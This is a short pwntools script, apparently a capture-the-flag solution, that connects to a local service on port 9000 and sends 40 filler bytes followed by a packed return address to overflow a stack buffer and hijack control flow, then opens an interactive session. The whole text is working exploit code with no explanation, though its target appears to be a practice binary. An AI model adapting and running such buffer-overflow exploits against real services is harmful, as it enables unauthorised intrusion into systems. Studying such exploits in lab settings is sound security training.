from pwn import *

p = remote('0.0.0.0', 9000)
p.sendline(b'A'*40+p64(0x0000000000401156))
p.interactive()